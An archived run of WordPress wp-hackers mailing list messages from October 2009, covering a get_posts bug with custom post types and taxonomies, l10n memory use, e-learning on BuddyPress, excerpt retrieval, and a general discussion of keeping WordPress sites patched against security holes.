Join wp_terms to the taxonomy table of type 'category'...

Thanks!

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Adriaan Pelzer
Sent: Thursday, October 15, 2009 4:43 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] need to get a list of categories from an old wp install

If I do a "SELECT name FROM wp_terms;", I get all my categories.



From aaron.jorbin at gmail.com  Thu Oct 15 21:52:06 2009
From: aaron.jorbin at gmail.com (Aaron Jorbin)
Date: Thu, 15 Oct 2009 14:52:06 -0700
Subject: [wp-hackers] get_posts with both a custom post_type and custom
	taxonomy
In-Reply-To: <7D1B85D7-53C6-48B3-A031-1FDAD62ED7F6@ftwr.co.uk>
References: <21952a280910121335h18737c32i59967125ac211120@mail.gmail.com>
	<32c7967e0910121627s569b813o7205b3371ddc5813@mail.gmail.com>
	<2E2838FA-4667-46B2-945B-763D8C2609E9@gmail.com>
	<696EF3D2-9646-478B-9CB6-04BC917E88E1@newclarity.net>
	<7D1B85D7-53C6-48B3-A031-1FDAD62ED7F6@ftwr.co.uk>
Message-ID: <21952a280910151452n37bd0210x59bd3ad99d865f5e@mail.gmail.com>

I svn up ed and that didn't solve it so i don't think it was fixed for
2.9.  I also looked through the patches and couldn't find anything
related to this.  I did open a ticket at
http://core.trac.wordpress.org/ticket/10934 but if it's a dupe, can
someone point me to the original?

On 10/12/09, Peter Westwood <peter.westwood at ftwr.co.uk> wrote:
> If I recall correctly this is already fixed for 2.9
>
> --
> Peter Westwood
> http://peter.westwood.name
>
> On 13 Oct 2009, at 01:58, Mike Schinkel <mikeschinkel at newclarity.net>
> wrote:
>
>> I agree that this is a bug and should be fixed.
>>
>> If a developer sets post_type in $args get_posts() should respect
>> it , not override it.
>>
>> -Mike Schinkel
>> WordPress Custom Plugins
>> http://mikeschinkel.com/custom-wordpress-plugins/
>>
>>
>> On Oct 12, 2009, at 8:52 PM, Christopher O'Connell wrote:
>>
>>> I agree, it should respect post type. Although, I've been solving
>>> this with pure SQL.
>>>
>>> YMMV
>>>
>>> ~ Christopher
>>>
>>> Sent from my iPhone
>>>
>>> On Oct 12, 2009, at 16:27, Leo germani <leogermani at gmail.com> wrote:
>>>
>>>> Hi Aaron,
>>>>
>>>> I often have the same problem when I want a custom query. Thing is
>>>> some
>>>> arguments overwrite the others in this function, and your
>>>> resulting query is
>>>> selecting posts with post type = post.
>>>>
>>>> My workaround is to use the query_posts hook to strip out this
>>>> condition
>>>> from the resulting sql whenever I want.
>>>>
>>>> This is an area where Im not sure wether its a bug or an expected
>>>> behavior.
>>>> But I think if you pass the post_type paramater it should respect
>>>> it no
>>>> matter what other paramaters are passed... Any one agree we could
>>>> open a
>>>> ticket for that? To not let other paramaters overwrite the post_type
>>>> paramater?
>>>>
>>>> Leo,,
>>>>
>>>> On Mon, Oct 12, 2009 at 5:35 PM, Aaron Jorbin <aaron.jorbin at gmail.com
>>>> >wrote:
>>>>
>>>>> I'm having an issue with get_posts and using a custom post_type and
>>>>> custom taxonomy.  It seems to always return empty.  If I do
>>>>> `
>>>>> $args = array('post_type' => 'my_post_type', 'foo' => 'bar');
>>>>> $my_posts = get_posts ($args);
>>>>> `
>>>>> foo is registered as a registered taxonomy that has query_var set
>>>>> to true.
>>>>> If I do a custom query for the following, it returns exactly what I
>>>>> would expect.
>>>>>
>>>>> `
>>>>> $sql = "SELECT * from $wpdb->posts
>>>>>     LEFT JOIN $wpdb->term_relationships ON
>>>>> $wpdb->term_relationships.object_id = $wpdb->posts.id
>>>>>     WHERE `$wpdb->posts`.`post_type` = 'my_post_type'
>>>>>     AND `$wpdb->term_relationships`.`term_taxonomy_id` =
>>>>> $my_term_id
>>>>>     ";
>>>>>
>>>>> `
>>>>>
>>>>> Is there an additional step that I am missing?  I opened up a trac
>>>>> ticket at http://core.trac.wordpress.org/ticket/10934 but haven't
>>>>> heard any responses there, so perhaps this isn't an actual bug.
>>>>> Any
>>>>> help that you can lead would be greatly appreciated.
>>>>>
>>>>> -Aaron Jorbin
>>>>>
>>>>> --
>>>>> aaron.jorbin at gmail.com
>>>>> http://aaron.jorb.in
>>>>> Twitter: @aaronjorbin
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>
>>>>
>>>>
>>>> --
>>>> leogermani.pirex.com.br
>>>> leogermani.estudiolivre.org
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
aaron.jorbin at gmail.com
http://aaron.jorb.in
Twitter: @aaronjorbin
971-231-3499

From peter.westwood at ftwr.co.uk  Thu Oct 15 22:02:04 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Thu, 15 Oct 2009 23:02:04 +0100
Subject: [wp-hackers] get_posts with both a custom post_type and custom
	taxonomy
In-Reply-To: <21952a280910151452n37bd0210x59bd3ad99d865f5e@mail.gmail.com>
References: <21952a280910121335h18737c32i59967125ac211120@mail.gmail.com>
	<32c7967e0910121627s569b813o7205b3371ddc5813@mail.gmail.com>
	<2E2838FA-4667-46B2-945B-763D8C2609E9@gmail.com>
	<696EF3D2-9646-478B-9CB6-04BC917E88E1@newclarity.net>
	<7D1B85D7-53C6-48B3-A031-1FDAD62ED7F6@ftwr.co.uk>
	<21952a280910151452n37bd0210x59bd3ad99d865f5e@mail.gmail.com>
Message-ID: <A235ABA6-5A42-4FDD-9441-7BE30DC64CEE@ftwr.co.uk>


On 15 Oct 2009, at 22:52, Aaron Jorbin wrote:

> I svn up ed and that didn't solve it so i don't think it was fixed for
> 2.9.  I also looked through the patches and couldn't find anything
> related to this.  I did open a ticket at
> http://core.trac.wordpress.org/ticket/10934 but if it's a dupe, can
> someone point me to the original?
>

My comment below referred to the code respecting post_type in args not  
the full issue you are seeing so Ii suspect the ticket is valid.

> On 10/12/09, Peter Westwood <peter.westwood at ftwr.co.uk> wrote:
>> If I recall correctly this is already fixed for 2.9
>>
>> --
>> Peter Westwood
>> http://peter.westwood.name
>>
>> On 13 Oct 2009, at 01:58, Mike Schinkel <mikeschinkel at newclarity.net>
>> wrote:
>>
>>> I agree that this is a bug and should be fixed.
>>>
>>> If a developer sets post_type in $args get_posts() should respect
>>> it , not override it.


-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From johan.eenfeldt at gmail.com  Fri Oct 16 00:45:33 2009
From: johan.eenfeldt at gmail.com (Johan Eenfeldt)
Date: Fri, 16 Oct 2009 02:45:33 +0200
Subject: [wp-hackers] l10n object bloat and class PO
Message-ID: <7547287e0910151745s154e7fd6ha9534cd3b925fd72@mail.gmail.com>

Somewhat specialized questions, here...

Working on caching the $l10n object (responsible for 20-75% of
localized WordPress startup time) I've been banging my head a bit
against the wp-include/pomo/ classes.

$l10n is 3.3Mb out of the ~14Mb startup WP allocations in my test. At
least 750Kb of that appears to be totally unused.

Question 1: is class PO [1] (wp-includes/pomo/po.php) ever used?

I'm guessing it might possibly be in the WP.com admin generate plugin
pot stuff, but there doesn't seem to be anything in WordPress.

Question 2: is there any reason not to remove (or split out) the
members of class Translation_Entry which are only used by PO (and not
MO)?

Thanks,
Johan

[1] Localization files quick reference for the lazy: .po files are the
semi-user-friendly structured text files that are transformed to the
binary .mo files used by, among other programs, WordPress.

From zamoose at gmail.com  Fri Oct 16 01:26:14 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Thu, 15 Oct 2009 21:26:14 -0400
Subject: [wp-hackers] A satisfied wp.com user
Message-ID: <94C69C19-D5DB-4DEE-805F-7939E211FB85@gmail.com>

Kudos, Automatticians:
http://whatever.scalzi.com/2009/10/15/wordpress-vip-one-year-in/

And if any of you haven't read the Old Man's War trilogy, you're  
missing out on some top shelf SyFy, errrrm, scifi.

*grin*

--
Doug Stewart

From sharon at BrewerRadio.com  Fri Oct 16 13:24:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Fri, 16 Oct 2009 09:24:00 -0400
Subject: [wp-hackers] wordpress security
Message-ID: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>

I had a site go down last night, and I think it?s a domain problem; however, when I was on tech support with my hosting provider last night, he mentioned more than once that Wordpress had some major security issues.
 
I was just wondering if any of you could expound on any security issues of which you might be aware?  Of particular concern to me is the fact that right before it went down, my functions.php file had been truncated TO THE SCREEN.  In other words, the last 10-15 lines of my functions.php file were echoed to the screen (including <?php ?> tags!!), something I?ve NEVER seen happen before.
 
Thanks for any advice.
 
Sharon Chambers
Webmaster
brewer media
1305 Carter Street
Chattanooga, TN 37402
(423)242-7652 office
(423)266-2335 fax
Sharon at BrewerMediaGroup.com
Brewer Broadcasting:
Power 94.9 | Groove 93.7 | ESPN Chattanooga 105.1 | Pulse News 95.3 
Brewer Interactive:
BOGONooga.com | ChattanoogaLivesGreen.com | ChattanoogaHasFun.com | ChattanoogaHasCars.com | ChattanoogaHasTravel.com | ChattanoogaCrime.com 
Brewer Publishing:
ChattanoogaPulse.com, The Pulse - Chattanooga's Alternative Weekly Newspaper
Chattanooga Traffic Network:
17 Radio Stations | 3 Television Stations | Traffic Reports & Sponsorships
 

From hempsworth at googlemail.com  Fri Oct 16 13:28:02 2009
From: hempsworth at googlemail.com (Alex Hempton-Smith)
Date: Fri, 16 Oct 2009 14:28:02 +0100
Subject: [wp-hackers] E-Learning and Wordpress
Message-ID: <5a1dad880910160628t7510bbe0o7237cd0f949cb2c9@mail.gmail.com>

Hi all,

We are building an online social network and learning environment for young
people based all around the world. The core site runs off WordPress MU and
BuddyPress, and we are looking at how we can offer an e-learning suite
alongside the social element (with course achievements etc showing up on
users activity feeds...)

For course resources we would like to innovate this slightly by allowing
users to submit content to the 'knowledgebase', which can be tagged
according to the content it relates to: articles, videos, audio, quotes,
links, images, can all be uploaded by users. Content which is deemed good
enough quality that it contrubites towards revision/learning for a course
would be tagged by teachers with the course name/id. I envisioned having
each of these items as a WordPress post in a special blog, which would have
a custom theme to allow people to create content from the front-end
(P2-esk).

We then need some kind of course management tool, like Moodle, which would
allow us to record data on students, grades, courses etc. Any ideas whether
this could be created within WP/BP/bbress some how? I'm keen to keep it as
in-house as possible, because of integrations etc. The wordpress.org plugins
repo is built off bbPress, so it certainly is a powerful platform...

What I'm asking the hackers is; what's your thoughts on using WP for the
applications I've described, and how would you possibly use WP for a
e-learning, course management etc facility?

Cheers,
Alex

From dragonfly at dragonflyeye.net  Fri Oct 16 13:33:07 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Fri, 16 Oct 2009 09:33:07 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
References: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
Message-ID: <77b239a00910160633n3114d861xe7896a8c193a5558@mail.gmail.com>

Sharon,

I would say that right before your system went down, the PHP interpreter
borked and you got that output. I have never seen that happen with
WordPress, nor can I think of a way that it might.

I'll leave it to others more knowledgeable on the security in's and out's to
describe security in detail. But every piece of software has security issues
from time to time and WordPress is no different. WordPress is frequently
updated to patch these holes, but not everything is caught. That's
development for you.

But I doubt if anything as nuanced as this is what the tech was talking
about. I suspect, as a person whose done time on the phones, that the tech
was stumped and looking for an excuse to not blame his company.

On Fri, Oct 16, 2009 at 9:24 AM, Sharon Chambers <sharon at brewerradio.com>wrote:

> I had a site go down last night, and I think it?s a domain problem;
> however, when I was on tech support with my hosting provider last night, he
> mentioned more than once that Wordpress had some major security issues.
>
> I was just wondering if any of you could expound on any security issues of
> which you might be aware?  Of particular concern to me is the fact that
> right before it went down, my functions.php file had been truncated TO THE
> SCREEN.  In other words, the last 10-15 lines of my functions.php file were
> echoed to the screen (including <?php ?> tags!!), something I?ve NEVER seen
> happen before.
>
> Thanks for any advice.
>
> Sharon Chambers
> Webmaster
> brewer media
> 1305 Carter Street
> Chattanooga, TN 37402
> (423)242-7652 office
> (423)266-2335 fax
> Sharon at BrewerMediaGroup.com
> Brewer Broadcasting:
> Power 94.9 | Groove 93.7 | ESPN Chattanooga 105.1 | Pulse News 95.3
> Brewer Interactive:
> BOGONooga.com | ChattanoogaLivesGreen.com | ChattanoogaHasFun.com |
> ChattanoogaHasCars.com | ChattanoogaHasTravel.com | ChattanoogaCrime.com
> Brewer Publishing:
> ChattanoogaPulse.com, The Pulse - Chattanooga's Alternative Weekly
> Newspaper
> Chattanooga Traffic Network:
> 17 Radio Stations | 3 Television Stations | Traffic Reports & Sponsorships
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Fri Oct 16 13:47:27 2009
From: scribu at gmail.com (scribu)
Date: Fri, 16 Oct 2009 16:47:27 +0300
Subject: [wp-hackers] E-Learning and Wordpress
In-Reply-To: <5a1dad880910160628t7510bbe0o7237cd0f949cb2c9@mail.gmail.com>
References: <5a1dad880910160628t7510bbe0o7237cd0f949cb2c9@mail.gmail.com>
Message-ID: <349fe48b0910160647g76adbd4fu2a1234df4d9bfd4d@mail.gmail.com>

Your project seems to be a perfect fit for BuddyPress, a sister project.

Check it out: http://buddypress.org/


-- 
http://scribu.net

From scribu at gmail.com  Fri Oct 16 13:53:13 2009
From: scribu at gmail.com (scribu)
Date: Fri, 16 Oct 2009 16:53:13 +0300
Subject: [wp-hackers] E-Learning and Wordpress
In-Reply-To: <349fe48b0910160647g76adbd4fu2a1234df4d9bfd4d@mail.gmail.com>
References: <5a1dad880910160628t7510bbe0o7237cd0f949cb2c9@mail.gmail.com>
	<349fe48b0910160647g76adbd4fu2a1234df4d9bfd4d@mail.gmail.com>
Message-ID: <349fe48b0910160653u2281ac0bj745eaa2e0b09de81@mail.gmail.com>

On Fri, Oct 16, 2009 at 4:47 PM, scribu <scribu at gmail.com> wrote:

> Your project seems to be a perfect fit for BuddyPress, a sister project.
>
> Check it out: http://buddypress.org/
>

Sorry about that. Didn't read the firts paragraph carefully.

For course resources we would like to innovate this slightly by allowing
> users to submit content to the 'knowledgebase', which can be tagged
> according to the content it relates to: articles, videos, audio, quotes,
> links, images, can all be uploaded by users. Content which is deemed good
> enough quality that it contrubites towards revision/learning for a course
> would be tagged by teachers with the course name/id. I envisioned having
> each of these items as a WordPress post in a special blog, which would have
> a custom theme to allow people to create content from the front-end
> (P2-esk).
>

This should be pretty straightforward. If you don't want to use the P2
theme, you can use the PostHaste plugin as a base.


We then need some kind of course management tool, like Moodle, which would
> allow us to record data on students, grades, courses etc. Any ideas whether
> this could be created within WP/BP/bbress some how? I'm keen to keep it as
> in-house as possible, because of integrations etc. The wordpress.orgplugins
> repo is built off bbPress, so it certainly is a powerful platform...
>

You will need a plugin that works with alot of custom tables for the course
management part, but it's do-able within the WP admin.

From hal at burgiss.net  Fri Oct 16 14:20:49 2009
From: hal at burgiss.net (Hal Burgiss)
Date: Fri, 16 Oct 2009 10:20:49 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
References: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
Message-ID: <20091016142049.GA16059@honey.burgiss.net>

On Fri, Oct 16, 2009 at 09:24:00AM -0400, Sharon Chambers wrote:
> I had a site go down last night, and I think it?s a domain problem;
> however, when I was on tech support with my hosting provider last night, he
> mentioned more than once that Wordpress had some major security issues.

What versions did he mention? Way older ones yes, newer ones none of
significance (that have surfaced). The good thing about the internet is that
anybody can say anything. The bad thing about the internet is that anybody can
say anything.

There is always things like weak passwords and loose file permissions, but
that is nothing about WP in particular.

I run about 30 sites based on WP and have had zero problems for quite a while.
A few of these are < 2.5 (patched/upgraded piecemeal). Most are 2.6 or 2.7
(difficult to upgrade for various reasons). 

-- 
Hal

From otto at ottodestruct.com  Fri Oct 16 14:25:21 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 16 Oct 2009 09:25:21 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
References: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
Message-ID: <161617690910160725qdd4f202g359096905785c963@mail.gmail.com>

The latest version of WordPress has no currently known security
problems. However, that doesn't mean there are not unknown ones.

It's like this: Any piece of software can have bugs. When the
WordPress team finds one, or is alerted to one, they fix it and
eliminate the problem. In the case of security issues, that usually
results in an immediate security fix release. 2.8.3 and 2.8.4, for
example, were security releases, to fix just found issues.

However, a security release only works if you actually upgrade. A
surprising lot of people don't.

Also consider that WordPress is a high profile target. A *lot* of
websites out there use it. So a security hole in WordPress, especially
an exploitable one, gets attacked by malicious people almost
immediately, and en masse. So when a release to fix a security hole
comes out, malicious people create code to exploit it and start trying
to mass-hack as many sites as they can.

Recently (last month), there was a lot of people getting their sites
hacked. The hackers exploited a problem that existed in WordPress
2.8.2 (and which was fixed in 2.8.3). WordPress was already up to
version 2.8.4, so the only people who got really hit hard were those
who failed to upgrade. WP 2.8.3 came out in August, so there was a
good month or two of lead time before hackers actively exploited the
problem that had already been fixed. Why didn't people upgrade within
that month? Good question.

As long as you upgrade early and often, there's no WordPress-specific
security issues you generally have to worry about.

There are other ways to hack websites though, and most of them don't
involve WordPress. Somebody can still get in your site and take it
over through some other means, so security on all other aspects of the
server environment must be watched as well. If you get hacked, don't
immediately jump to a conclusion as to how it occurred, because the
odds against it attacking via a fully-up-to-date WordPress are slim.
Since I've been using WordPress, I have yet to see any zero-day
exploits against it occur. It's always been something targeting older
versions and people who failed to upgrade.

-Otto
Sent from Memphis, TN, United States

From ncrice at gmail.com  Fri Oct 16 14:33:45 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Fri, 16 Oct 2009 10:33:45 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <161617690910160725qdd4f202g359096905785c963@mail.gmail.com>
References: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
	<161617690910160725qdd4f202g359096905785c963@mail.gmail.com>
Message-ID: <862d087f0910160733x7395f104v6f89d1529d09600c@mail.gmail.com>

I'm sure this has been mentioned before (elsewhere), but it's important to
note that not all WordPress users log into their dashboard every day, and
the vast majority of WordPress users don't subscribe to any RSS feed that
would indicate that WordPress needs to be upgraded.

The automatic updates are fantastic, and are a huge step in the right
direction, but an alert system needs to be put in place so that as soon as
your WP install notices there's an upgrade available, it needs to email the
Admin.

(Forgive me if this is already in motion for the next version. If it is,
then congratulations for being proactive in this regard.)

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com


On Fri, Oct 16, 2009 at 10:25 AM, Otto <otto at ottodestruct.com> wrote:

> The latest version of WordPress has no currently known security
> problems. However, that doesn't mean there are not unknown ones.
>
> It's like this: Any piece of software can have bugs. When the
> WordPress team finds one, or is alerted to one, they fix it and
> eliminate the problem. In the case of security issues, that usually
> results in an immediate security fix release. 2.8.3 and 2.8.4, for
> example, were security releases, to fix just found issues.
>
> However, a security release only works if you actually upgrade. A
> surprising lot of people don't.
>
> Also consider that WordPress is a high profile target. A *lot* of
> websites out there use it. So a security hole in WordPress, especially
> an exploitable one, gets attacked by malicious people almost
> immediately, and en masse. So when a release to fix a security hole
> comes out, malicious people create code to exploit it and start trying
> to mass-hack as many sites as they can.
>
> Recently (last month), there was a lot of people getting their sites
> hacked. The hackers exploited a problem that existed in WordPress
> 2.8.2 (and which was fixed in 2.8.3). WordPress was already up to
> version 2.8.4, so the only people who got really hit hard were those
> who failed to upgrade. WP 2.8.3 came out in August, so there was a
> good month or two of lead time before hackers actively exploited the
> problem that had already been fixed. Why didn't people upgrade within
> that month? Good question.
>
> As long as you upgrade early and often, there's no WordPress-specific
> security issues you generally have to worry about.
>
> There are other ways to hack websites though, and most of them don't
> involve WordPress. Somebody can still get in your site and take it
> over through some other means, so security on all other aspects of the
> server environment must be watched as well. If you get hacked, don't
> immediately jump to a conclusion as to how it occurred, because the
> odds against it attacking via a fully-up-to-date WordPress are slim.
> Since I've been using WordPress, I have yet to see any zero-day
> exploits against it occur. It's always been something targeting older
> versions and people who failed to upgrade.
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jane at automattic.com  Fri Oct 16 14:43:05 2009
From: jane at automattic.com (Jane Wells)
Date: Fri, 16 Oct 2009 10:43:05 -0400
Subject: [wp-hackers] E-Learning and Wordpress
In-Reply-To: <mailman.4533.1255703626.16651.wp-hackers@lists.automattic.com>
References: <mailman.4533.1255703626.16651.wp-hackers@lists.automattic.com>
Message-ID: <54B92D95-EC90-4503-B174-D88CC5360CEF@automattic.com>

> From: Alex Hempton-Smith <hempsworth at googlemail.com>
> What I'm asking the hackers is; what's your thoughts on using WP for  
> the
> applications I've described, and how would you possibly use WP for a
> e-learning, course management etc facility?
Alex, there is a very big community of academic users of WordPress, MU  
and BuddyPress. I suggest you subscribe and post to the wp-edu list,  
which serves this community's specific needs. In the meantime, you  
might look into the Courseware plugin for WordPress. Not sure where  
you're located, but WordCamp New York City in November will have  
tracks for academic use and BuddyPress/MU development. CUNY and  
University of Mary Washington are both good examples of universities  
using BuddyPress and various plugins in an MU environment for academic  
purposes.
Jane

From daiv at daivmowbray.com  Thu Oct 15 08:40:20 2009
From: daiv at daivmowbray.com (Daiv Mowbray)
Date: Thu, 15 Oct 2009 10:40:20 +0200
Subject: [wp-hackers] get the excerpt in custom loop
Message-ID: <716E44E2-7B80-49CA-A6F0-9D727B1AEEED@daivmowbray.com>


Hello list,

I'm running through an array of attachments,
trying to pull certain elements from the attachments parent.
the function get_the_excerpt seams to be deprecated.

How can I pull the excerpt without it being echoed directly to the page?
This echos to page:
	$my_parent_excerpt = the_excerpt($my_parent);
as does this:
	$my_parent_excerpt = the_content_rss(); // can not pass the post ID  
to this

EXAMPLE:
foreach ( $all_attachments as $attachment ) {

			$my_parent = ($attachment->post_parent); 	// this works, returns  
the parent ID
			$parent_link = get_permalink($my_parent);	 // this works, returns  
the parent link
			$my_parent_title = get_the_title($my_parent);	// this works,  
returns the parent title
			$my_parent_excerpt = get_the_excerpt($my_parent); 	// this only  
works for the first item/attachment parent

$output = $my_parent_title;
$output .= $my_parent_excerpt;
echo $output;
}
TIA
----------
Daiv Mowbray
daiv at daivmowbray.com
----------



From sharon at BrewerRadio.com  Fri Oct 16 14:51:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Fri, 16 Oct 2009 10:51:00 -0400
Subject: [wp-hackers] wordpress security
Message-ID: <1e5a9567.1ca4e70.230ac6eb.4944@BrewerRadio.com>

AFAIK, we were running the latest version of Wordpress.  I upgrade routinely whenever there's a new version.  And we've since changed all DB and FTP passwords; we'll update the admin passwords when the site comes back up.  I realize nothing's fool-proof when it comes to internet security.

Just to be clear, I wasn't bashing Wordpress security; I merely wanted the advice of the people I've come to respect here when it comes to Wordpress.  And my hosting provider knows jack squat about the problem (as per usual--she actually suggested that I had an incompatible theme and I needed to disable that folder via FTP), so it appears the earlier mention of them blaming Wordpress as a last resort seems reasonable.

As always, downtime gives you those few hours to contemplate security more than you have in the past year...just wanted to make sure I covered all my bases.


Thanks,
-Sharon

-----Original Message-----
Recently (last month), there was a lot of people getting their sites
hacked. The hackers exploited a problem that existed in WordPress
2.8.2 (and which was fixed in 2.8.3). WordPress was already up to
version 2.8.4, so the only people who got really hit hard were those
who failed to upgrade. WP 2.8.3 came out in August, so there was a
good month or two of lead time before hackers actively exploited the
problem that had already been fixed. Why didn't people upgrade within
that month? Good question.



From otto at ottodestruct.com  Fri Oct 16 15:02:31 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 16 Oct 2009 10:02:31 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910160733x7395f104v6f89d1529d09600c@mail.gmail.com>
References: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com> 
	<161617690910160725qdd4f202g359096905785c963@mail.gmail.com> 
	<862d087f0910160733x7395f104v6f89d1529d09600c@mail.gmail.com>
Message-ID: <161617690910160802r6c7fc65w401138efece51f81@mail.gmail.com>

On Fri, Oct 16, 2009 at 9:33 AM, Nathan Rice <ncrice at gmail.com> wrote:
> I'm sure this has been mentioned before (elsewhere), but it's important to
> note that not all WordPress users log into their dashboard every day, and
> the vast majority of WordPress users don't subscribe to any RSS feed that
> would indicate that WordPress needs to be upgraded.

True, but an automatic email notification to the admin would just have
lots of people asking us how to turn it off.

You can't make people do something they don't want to do. If they
don't want to be active about it, then continuously annoying them
ain't gonna do it.

If somebody wants to get a notification of new releases, then here's
the feed you'll want to subscribe to:
http://wordpress.org/development/category/releases/feed/

Promote that feed however you like. Create automated emails based on
it if you wish.

-Otto
Sent from Memphis, TN, United States

From ncrice at gmail.com  Fri Oct 16 15:10:28 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Fri, 16 Oct 2009 11:10:28 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <161617690910160802r6c7fc65w401138efece51f81@mail.gmail.com>
References: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
	<161617690910160725qdd4f202g359096905785c963@mail.gmail.com>
	<862d087f0910160733x7395f104v6f89d1529d09600c@mail.gmail.com>
	<161617690910160802r6c7fc65w401138efece51f81@mail.gmail.com>
Message-ID: <862d087f0910160810g6ff0c86cv32bef34125f615e2@mail.gmail.com>

On Fri, Oct 16, 2009 at 11:02 AM, Otto <otto at ottodestruct.com> wrote:

> True, but an automatic email notification to the admin would just have
> lots of people asking us how to turn it off.
>

Then give them a way to turn it off.


>
> You can't make people do something they don't want to do. If they
> don't want to be active about it, then continuously annoying them
> ain't gonna do it.
>

I wouldn't call it an annoyance, any more than the update notifier at the
top of the dashboard is annoying. If WordPress wants to save its reputation
from people who blame every exploit in it, then it needs to do everything
possible to get people to upgrade.

If the user turns off email notifications, then at least they can't blame
WordPress. There needs to be a way people can receive notifications
passively, without having to actively seek them out (logging into the
dashboard, subscribing to a feed, etc.).

Instead of berating people for being normal and non-geeks, why not just give
them a useful feature that will help them stay secure. What's the harm in
that?


>
> If somebody wants to get a notification of new releases, then here's
> the feed you'll want to subscribe to:
> http://wordpress.org/development/category/releases/feed/
>
> Promote that feed however you like. Create automated emails based on
> it if you wish.
>
>
Never gonna happen. And I don't blame them. If I was just a WP user, and not
in the business full-time, I doubt very seriously that I would 1. log into
my dashboard every day or 2. subscribe to a WP RSS feed. And because of
that, I would be at risk.

Why not just eliminate that risk?

From scribu at gmail.com  Fri Oct 16 15:13:59 2009
From: scribu at gmail.com (scribu)
Date: Fri, 16 Oct 2009 18:13:59 +0300
Subject: [wp-hackers] get the excerpt in custom loop
In-Reply-To: <716E44E2-7B80-49CA-A6F0-9D727B1AEEED@daivmowbray.com>
References: <716E44E2-7B80-49CA-A6F0-9D727B1AEEED@daivmowbray.com>
Message-ID: <349fe48b0910160813x511df4f4k8b748fc06f9f7764@mail.gmail.com>

On Thu, Oct 15, 2009 at 11:40 AM, Daiv Mowbray <daiv at daivmowbray.com> wrote:

>
> Hello list,
>
> I'm running through an array of attachments,
> trying to pull certain elements from the attachments parent.
> the function get_the_excerpt seams to be deprecated.
>

get_the_excerpt() is not deprecated, just it's parameter. Deprecated
functions are moved to wp-includes/deprecated.php.


-- 
http://scribu.net

From sharon at BrewerRadio.com  Fri Oct 16 15:19:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Fri, 16 Oct 2009 11:19:00 -0400
Subject: [wp-hackers] wordpress security
Message-ID: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>

-----Original Message-----
I wouldn't call it an annoyance, any more than the update notifier at the
top of the dashboard is annoying. If WordPress wants to save its reputation
from people who blame every exploit in it, then it needs to do everything
possible to get people to upgrade.

Instead of berating people for being normal and non-geeks, why not just give
them a useful feature that will help them stay secure. What's the harm in
that?



I would call it annoyance.  Anyone professing themselves to be website admin should be logging into their dashboard on occasion, and anyone failing to do so has no one but themselves to blame for security threats.

I fail to see why a non-geek web admin would be considered "normal" at any rate.  


From scribu at gmail.com  Fri Oct 16 15:20:28 2009
From: scribu at gmail.com (scribu)
Date: Fri, 16 Oct 2009 18:20:28 +0300
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910160810g6ff0c86cv32bef34125f615e2@mail.gmail.com>
References: <78733c5.1ca4e64.22bb8d0f.5f49@BrewerRadio.com>
	<161617690910160725qdd4f202g359096905785c963@mail.gmail.com>
	<862d087f0910160733x7395f104v6f89d1529d09600c@mail.gmail.com>
	<161617690910160802r6c7fc65w401138efece51f81@mail.gmail.com>
	<862d087f0910160810g6ff0c86cv32bef34125f615e2@mail.gmail.com>
Message-ID: <349fe48b0910160820o31bb1d0n72e16b0d5d1d3309@mail.gmail.com>

On Fri, Oct 16, 2009 at 6:10 PM, Nathan Rice <ncrice at gmail.com> wrote:

> On Fri, Oct 16, 2009 at 11:02 AM, Otto <otto at ottodestruct.com> wrote:
>
